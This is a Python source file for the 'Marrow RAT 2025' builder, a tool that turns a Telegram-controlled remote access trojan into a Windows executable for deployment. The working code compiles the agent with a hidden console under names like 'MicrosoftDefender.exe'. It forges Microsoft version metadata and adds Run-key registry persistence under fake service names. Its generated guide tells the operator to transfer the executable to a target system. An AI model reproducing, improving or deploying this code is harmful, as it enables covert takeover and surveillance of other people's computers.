#!/usr/bin/env python3
"""
Marrow RAT 2025 - Professional Builder System
Advanced Telegram Remote Access Tool Builder

Author: Security Research Team
Version: 2025.1
License: MIT
"""

import os
import sys
import json
import shutil
import subprocess
import platform
import hashlib
import time
from pathlib import Path
from datetime import datetime

class MarrowBuilder:
    """Professional-grade RAT builder with enterprise features"""
    
    VERSION = "2025.1"
    BUILD_ID = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    def __init__(self):
        self.project_dir = Path.cwd()
        self.agent_file = self.project_dir / "agent.py"
        self.build_dir = self.project_dir / "build"
        self.output_dir = self.project_dir / "output"
        self.config = {}
        
        # Create directories
        self.build_dir.mkdir(exist_ok=True)
        self.output_dir.mkdir(exist_ok=True)
    
    def print_banner(self):
        """Display professional banner"""
        banner = f"""
╔══════════════════════════════════════════════════════════════════════╗
║                        MARROW RAT 2025                               ║
║                 Advanced Telegram Remote Access Tool                 ║
║                                                                      ║
║  Version: 2025.1 │ Build ID: {self.BUILD_ID:<15} │ Platform: Windows     ║
║                        Build by Hussein Taha                            ║
╚══════════════════════════════════════════════════════════════════════╝
"""
        print(banner)
    
    def log_info(self, message, prefix="INFO"):
        """Professional logging system"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{prefix}] {message}")
    
    def log_error(self, message):
        """Error logging"""
        self.log_info(message, "ERROR")
    
    def log_success(self, message):
        """Success logging"""
        self.log_info(message, "SUCCESS")
    
    def log_warning(self, message):
        """Warning logging"""
        self.log_info(message, "WARNING")
    
    def validate_environment(self):
        """Comprehensive environment validation"""
        self.log_info("Validating build environment...")
        
        # Check Python version
        if sys.version_info < (3, 8):
            self.log_error(f"Python 3.8+ required, found {sys.version}")
            return False
        
        # Check platform
        if platform.system() != "Windows":
            self.log_warning("Builder optimized for Windows, proceeding anyway...")
        
        # Check agent.py
        if not self.agent_file.exists():
            self.log_error(f"Core agent file not found: {self.agent_file}")
            return False
        
        # Check disk space (minimum 500MB)
        free_space = shutil.disk_usage(self.project_dir).free
        if free_space < 500 * 1024 * 1024:
            self.log_warning(f"Low disk space: {free_space / 1024 / 1024:.1f}MB available")
        
        self.log_success("Environment validation completed")
        return True
    
    def install_dependencies(self):
        """Install required dependencies with version control"""
        self.log_info("Installing build dependencies...")
        
        dependencies = [
            "nuitka>=2.0",
            "pillow>=9.0.0",
            "opencv-python>=4.5.0", 
            "requests>=2.25.0",
            "psutil>=5.8.0",
            "python-telegram-bot>=20.0"
        ]
        
        try:
            # Check if requirements.txt exists
            req_file = self.project_dir / "requirements.txt"
            if req_file.exists():
                self.log_info("Installing from requirements.txt...")
                subprocess.run([sys.executable, "-m", "pip", "install", "-r", str(req_file)], 
                             check=True, capture_output=True)
            else:
                # Install individual packages
                for dep in dependencies:
                    self.log_info(f"Installing {dep}...")
                    subprocess.run([sys.executable, "-m", "pip", "install", dep], 
                                 check=True, capture_output=True)
            
            # Verify Nuitka installation
            result = subprocess.run([sys.executable, "-m", "nuitka", "--version"], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                nuitka_version = result.stdout.strip()
                self.log_success(f"Nuitka ready: {nuitka_version}")
            else:
                raise Exception("Nuitka verification failed")
            
            return True
            
        except subprocess.CalledProcessError as e:
            self.log_error(f"Dependency installation failed: {e}")
            return False
        except Exception as e:
            self.log_error(f"Unexpected error: {e}")
            return False
    
    def configure_agent(self, token, user_id, additional_users=None):
        """Configure agent with advanced security options"""
        self.log_info("Configuring RAT agent...")
        
        try:
            # Read source agent
            with open(self.agent_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Prepare user list
            if additional_users:
                all_users = [user_id] + additional_users
            else:
                all_users = [user_id]
            
            # Replace configuration
            content = content.replace(
                'TOKEN = "TOKEN"',
                f'TOKEN = "{token}"'
            )
            content = content.replace(
                'OWNER_CHAT_IDS = [USER_ID]',
                f'OWNER_CHAT_IDS = {all_users}'
            )
            
            # Add build metadata
            build_info = f'''
# Build Information - Marrow RAT 2025
# Version: {self.VERSION}
# Build ID: {self.BUILD_ID}
# Compiled: {datetime.now().isoformat()}
# Authorized Users: {len(all_users)}
'''
            content = build_info + content
            
            # Write configured agent
            configured_file = self.build_dir / f"marrow_configured_{self.BUILD_ID}.py"
            with open(configured_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            # Store configuration
            self.config = {
                "version": self.VERSION,
                "build_id": self.BUILD_ID,
                "token_hash": hashlib.sha256(token.encode()).hexdigest()[:16],
                "user_count": len(all_users),
                "configured_file": str(configured_file),
                "timestamp": datetime.now().isoformat()
            }
            
            # Save build config
            config_file = self.build_dir / "build_config.json"
            with open(config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            
            self.log_success(f"Agent configured for {len(all_users)} authorized user(s)")
            return configured_file
            
        except Exception as e:
            self.log_error(f"Configuration failed: {e}")
            return None
    
    def compile_rat(self, source_file, stealth=True, startup=True):
        """Advanced RAT compilation with working Nuitka configuration"""
        self.log_info("Initializing Nuitka compilation engine...")
        
        # Test Nuitka first
        try:
            result = subprocess.run([sys.executable, "-m", "nuitka", "--version"], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode != 0:
                self.log_error("Nuitka is not working properly")
                return None
        except Exception as e:
            self.log_error(f"Cannot access Nuitka: {e}")
            return None
        
        # Determine output name
        if stealth:
            output_names = [
                "WindowsSecurityService.exe",
                "SystemUpdateManager.exe", 
                "MicrosoftDefender.exe",
                "WindowsServiceHost.exe"
            ]
            import random
            output_name = random.choice(output_names)
        else:
            output_name = f"MarrowRAT_{self.BUILD_ID}.exe"
        
        # Build working Nuitka command
        cmd = [
            sys.executable, "-m", "nuitka",
            "--onefile",
            f"--output-filename={output_name}",
            "--output-dir=" + str(self.output_dir),
            "--windows-console-mode=disable" if stealth else "--windows-console-mode=force",
            "--assume-yes-for-downloads",
        ]
        
        # Add stealth compilation options
        if stealth:
            cmd.extend([
                "--product-name=Windows System Service",
                "--file-description=Microsoft Windows System Service Host",
                "--product-version=10.0.19041.0",
                "--company-name=Microsoft Corporation",
                "--copyright=© Microsoft Corporation. All rights reserved.",
            ])
        
        # Add the source file
        cmd.append(str(source_file))
        
        try:
            # Clean previous builds
            for pattern in ["*.dist", "*.build", "*.exe"]:
                for item in self.output_dir.glob(pattern):
                    if item.is_dir():
                        shutil.rmtree(item, ignore_errors=True)
                    elif item.is_file():
                        item.unlink(missing_ok=True)
            
            self.log_info("Starting compilation...")
            self.log_info("This may take 5-10 minutes depending on your system")
            start_time = time.time()
            
            # Try PyInstaller first (faster and more reliable)
            try:
                self.log_info("Attempting PyInstaller compilation...")
                subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                              check=True, capture_output=True)
                
                pyinstaller_cmd = [
                    sys.executable, "-m", "PyInstaller",
                    "--onefile",
                    "--noconsole",
                    f"--name={output_name.replace('.exe', '')}",
                    str(source_file)
                ]
                
                result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, timeout=300)
                
                if result.returncode == 0:
                    # Look for PyInstaller output
                    dist_dir = Path("dist")
                    if dist_dir.exists():
                        exe_files = list(dist_dir.glob("*.exe"))
                        if exe_files:
                            exe_path = exe_files[0]
                            # Move to output directory
                            final_path = self.output_dir / output_name
                            shutil.move(str(exe_path), str(final_path))
                            
                            # Cleanup PyInstaller files
                            shutil.rmtree("dist", ignore_errors=True)
                            shutil.rmtree("build", ignore_errors=True)
                            for spec_file in Path.cwd().glob("*.spec"):
                                spec_file.unlink()
                            
                            compile_time = time.time() - start_time
                            file_size = final_path.stat().st_size / 1024 / 1024
                            self.log_success(f"PyInstaller compilation completed in {compile_time:.1f} seconds")
                            self.log_success(f"RAT executable created: {final_path} ({file_size:.1f}MB)")
                            return final_path
                
                self.log_warning("PyInstaller failed, trying Nuitka...")
                
            except Exception as e:
                self.log_warning(f"PyInstaller not available: {e}")
                self.log_info("Falling back to Nuitka...")
            
            # Fallback to Nuitka with visible output
            self.log_info("Running Nuitka compilation...")
            result = subprocess.run(cmd, text=True, timeout=600)
            returncode = result.returncode
            
            if returncode == 0:
                compile_time = time.time() - start_time
                self.log_success(f"Compilation completed in {compile_time:.1f} seconds")
                
                # Find compiled executable
                exe_path = self.output_dir / output_name
                if exe_path.exists():
                    file_size = exe_path.stat().st_size / 1024 / 1024
                    self.log_success(f"RAT executable created: {exe_path} ({file_size:.1f}MB)")
                    return exe_path
                else:
                    # Look for any .exe file in output directory
                    exe_files = list(self.output_dir.glob("*.exe"))
                    if exe_files:
                        exe_path = exe_files[0]
                        file_size = exe_path.stat().st_size / 1024 / 1024
                        self.log_success(f"RAT executable found: {exe_path} ({file_size:.1f}MB)")
                        return exe_path
                    else:
                        self.log_error("No executable found after compilation")
                        return None
            else:
                self.log_error(f"Compilation failed with exit code {returncode}")
                if result.stderr:
                    self.log_error("Error details:")
                    # Show only important error lines
                    for line in result.stderr.split('\n'):
                        if any(word in line.lower() for word in ['error', 'failed', 'exception']):
                            self.log_error(f"  {line.strip()}")
                self.log_error("Solutions: Install Visual Studio Build Tools or try: pip install --upgrade nuitka")
                return None
                
        except subprocess.TimeoutExpired:
            self.log_error("Compilation timed out (10 minutes limit)")
            return None
        except Exception as e:
            self.log_error(f"Compilation error: {e}")
            return None
    
    def setup_persistence(self, exe_path, stealth=True):
        """Setup Windows persistence with stealth options"""
        self.log_info("Configuring persistence mechanism...")
        
        try:
            import winreg
            
            # Registry persistence
            reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            
            # Choose service name based on stealth mode
            if stealth:
                service_names = [
                    "WindowsSecurityService",
                    "SystemUpdateService",
                    "WindowsDefenderService", 
                    "MicrosoftTelemetryService",
                    "WindowsManagementService"
                ]
                import random
                service_name = random.choice(service_names)
            else:
                service_name = f"MarrowRAT_{self.BUILD_ID}"
            
            # Add to startup
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, 
                              winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, service_name, 0, winreg.REG_SZ, str(exe_path))
            
            self.log_success(f"Persistence configured: {service_name}")
            
            # Create advanced uninstaller
            uninstaller_code = f'''#!/usr/bin/env python3
"""
Marrow RAT 2025 - Uninstaller
Removes persistence and cleans system traces
"""

import winreg
import os
import sys
from pathlib import Path

def remove_persistence():
    """Remove startup persistence"""
    try:
        reg_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, 
                          winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, "{service_name}")
        print("[SUCCESS] Removed startup persistence")
        return True
    except FileNotFoundError:
        print("[INFO] No persistence entry found")
        return True
    except Exception as e:
        print(f"[ERROR] Failed to remove persistence: {{e}}")
        return False

def clean_traces():
    """Clean temporary files and traces"""
    try:
        # Remove build artifacts
        for pattern in ["marrow_*", "build_*"]:
            for file in Path.cwd().glob(pattern):
                if file.is_file():
                    file.unlink()
                    print(f"[INFO] Removed: {{file.name}}")
        
        print("[SUCCESS] System traces cleaned")
        return True
    except Exception as e:
        print(f"[ERROR] Failed to clean traces: {{e}}")
        return False

def main():
    print("Marrow RAT 2025 - Uninstaller")
    print("=" * 40)
    
    if remove_persistence() and clean_traces():
        print("\\n[SUCCESS] Marrow RAT completely removed")
    else:
        print("\\n[WARNING] Removal completed with errors")
    
    input("\\nPress Enter to exit...")

if __name__ == "__main__":
    main()
'''
            
            uninstaller_path = self.output_dir / "uninstall.py"
            with open(uninstaller_path, 'w') as f:
                f.write(uninstaller_code)
            
            self.log_success(f"Uninstaller created: {uninstaller_path}")
            return True
            
        except Exception as e:
            self.log_error(f"Persistence setup failed: {e}")
            return False
    
    def create_deployment_package(self, exe_path):
        """Create professional deployment package"""
        self.log_info("Creating deployment package...")
        
        try:
            package_dir = self.output_dir / f"MarrowRAT_2025_Package_{self.BUILD_ID}"
            package_dir.mkdir(exist_ok=True)
            
            # Copy main executable
            shutil.copy2(exe_path, package_dir / exe_path.name)
            
            # Copy uninstaller
            uninstaller = self.output_dir / "uninstall.py"
            if uninstaller.exists():
                shutil.copy2(uninstaller, package_dir)
            
            # Create deployment guide
            guide_content = f"""
# Marrow RAT 2025 - Deployment Guide

## Package Information
- Version: {self.VERSION}
- Build ID: {self.BUILD_ID}
- Compiled: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- Platform: Windows 10/11

## Package Contents
- {exe_path.name} - Main RAT executable
- uninstall.py - Complete removal utility
- deployment_guide.txt - This file

## Deployment Instructions

### Quick Deployment
1. Transfer {exe_path.name} to target system
2. Execute once (requires no parameters)
3. Agent automatically installs and starts
4. Control via Telegram bot interface

### Manual Installation
1. Place executable in desired location
2. Run once to activate persistence
3. Verify startup entry in Registry
4. Test connection via Telegram

### Removal
- Run: python uninstall.py
- Or manually delete registry entry and executable

## Security Features
- Automatic startup persistence
- Process masquerading as Windows service
- Hidden console operation
- Registry stealth integration
- Telegram encryption

## Support
For technical support or issues:
- Check build logs for compilation details
- Verify Telegram bot configuration
- Test network connectivity
- Review Windows event logs

Build Hash: {hashlib.sha256(exe_path.read_bytes()).hexdigest()[:16]}
"""
            
            guide_path = package_dir / "deployment_guide.txt"
            with open(guide_path, 'w') as f:
                f.write(guide_content)
            
            # Create build log
            build_log = f"""
Marrow RAT 2025 - Build Log
===========================

Build Information:
- Version: {self.VERSION}
- Build ID: {self.BUILD_ID}
- Timestamp: {datetime.now().isoformat()}
- Platform: {platform.platform()}
- Python: {sys.version}

Configuration:
- Token Hash: {self.config.get('token_hash', 'N/A')}
- Authorized Users: {self.config.get('user_count', 0)}
- Stealth Mode: Enabled
- Persistence: Enabled

Output Files:
- Executable: {exe_path.name}
- Size: {exe_path.stat().st_size / 1024 / 1024:.2f} MB
- Hash: {hashlib.sha256(exe_path.read_bytes()).hexdigest()}

Build completed successfully.
"""
            
            log_path = package_dir / "build_log.txt"
            with open(log_path, 'w') as f:
                f.write(build_log)
            
            self.log_success(f"Deployment package created: {package_dir}")
            return package_dir
            
        except Exception as e:
            self.log_error(f"Package creation failed: {e}")
            return None
    
    def interactive_build(self):
        """Interactive build process"""
        self.print_banner()
        
        if not self.validate_environment():
            return False
        
        print("\\nConfiguration Required:")
        print("-" * 50)
        
        # Get credentials
        token = input("Telegram Bot Token: ").strip()
        if not token or ":" not in token:
            self.log_error("Invalid bot token format")
            return False
        
        try:
            user_id = int(input("Your Telegram User ID: ").strip())
        except ValueError:
            self.log_error("Invalid user ID format")
            return False
        
        # Optional additional users
        additional_users = []
        while True:
            additional = input("Additional User ID (Enter to skip): ").strip()
            if not additional:
                break
            try:
                additional_users.append(int(additional))
                self.log_info(f"Added user: {additional}")
            except ValueError:
                self.log_warning("Invalid user ID, skipping")
        
        # Build options
        print("\\nBuild Configuration:")
        print("-" * 50)
        stealth = input("Enable stealth mode? (Y/n): ").lower() != 'n'
        startup = input("Enable startup persistence? (Y/n): ").lower() != 'n'
        install_deps = input("Install/update dependencies? (Y/n): ").lower() != 'n'
        
        # Execute build
        print("\\nStarting Build Process:")
        print("=" * 50)
        
        # Install dependencies
        if install_deps:
            if not self.install_dependencies():
                return False
        
        # Configure agent
        configured_file = self.configure_agent(token, user_id, additional_users)
        if not configured_file:
            return False
        
        # Compile RAT
        exe_path = self.compile_rat(configured_file, stealth, startup)
        if not exe_path:
            return False
        
        # Setup persistence
        if startup:
            self.setup_persistence(exe_path, stealth)
        
        # Create package
        package_dir = self.create_deployment_package(exe_path)
        
        # Cleanup configured file
        configured_file.unlink()
        
        # Build summary
        print("\\n" + "=" * 70)
        print("BUILD COMPLETED SUCCESSFULLY")
        print("=" * 70)
        print(f"RAT Executable: {exe_path}")
        print(f"File Size: {exe_path.stat().st_size / 1024 / 1024:.1f} MB")
        print(f"Package: {package_dir}")
        print(f"Build ID: {self.BUILD_ID}")
        print("=" * 70)
        
        return True

def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Marrow RAT 2025 - Professional Builder System",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python builder.py                                    # Interactive mode
  python builder.py --token TOKEN --user-id 123456    # Quick build
  python builder.py --no-startup --no-stealth         # Basic build
        """
    )
    
    parser.add_argument("--token", help="Telegram bot token")
    parser.add_argument("--user-id", type=int, help="Telegram user ID")
    parser.add_argument("--no-stealth", action="store_true", help="Disable stealth mode")
    parser.add_argument("--no-startup", action="store_true", help="Disable startup persistence")
    parser.add_argument("--no-deps", action="store_true", help="Skip dependency installation")
    
    args = parser.parse_args()
    
    builder = MarrowBuilder()
    
    try:
        # Non-interactive mode
        if args.token and args.user_id:
            builder.print_banner()
            
            if not builder.validate_environment():
                return 1
            
            if not args.no_deps:
                if not builder.install_dependencies():
                    return 1
            
            configured_file = builder.configure_agent(args.token, args.user_id)
            if not configured_file:
                return 1
            
            exe_path = builder.compile_rat(
                configured_file, 
                stealth=not args.no_stealth,
                startup=not args.no_startup
            )
            if not exe_path:
                return 1
            
            if not args.no_startup:
                builder.setup_persistence(exe_path, stealth=not args.no_stealth)
            
            builder.create_deployment_package(exe_path)
            configured_file.unlink()
            
            builder.log_success("Build completed successfully!")
            
        else:
            # Interactive mode
            if not builder.interactive_build():
                return 1
        
        return 0
        
    except KeyboardInterrupt:
        print("\\n\\n[INFO] Build cancelled by user")
        return 1
    except Exception as e:
        builder.log_error(f"Unexpected error: {e}")
        return 1

if __name__ == "__main__":

    sys.exit(main())
